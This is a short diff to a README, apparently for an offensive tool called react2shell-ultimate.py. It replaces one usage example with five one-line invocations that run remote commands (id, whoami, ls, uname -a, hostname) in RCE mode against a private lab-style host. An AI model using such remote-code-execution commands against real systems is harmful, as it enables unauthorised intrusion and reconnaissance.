@@ -67,10 +67,11 @@ python3 react2shell-ultimate.py -u http://10.129.8.62:3000
 ### 💥 Execute Remote Command
 
 ```bash
-python3 react2shell-ultimate.py \
--u http://10.129.8.62:3000 \
---mode rce \
---exec "id"
+python3 react2shell-ultimate.py -u http://10.129.8.62:3000 --mode rce --exec "id"
+python3 react2shell-ultimate.py -u http://10.129.8.62:3000 --mode rce --exec "whoami"
+python3 react2shell-ultimate.py -u http://10.129.8.62:3000 --mode rce --exec "ls"
+python3 react2shell-ultimate.py -u http://10.129.8.62:3000 --mode rce --exec "uname -a"
+python3 react2shell-ultimate.py -u http://10.129.8.62:3000 --mode rce --exec "hostname"
 ```
 
 ```bash
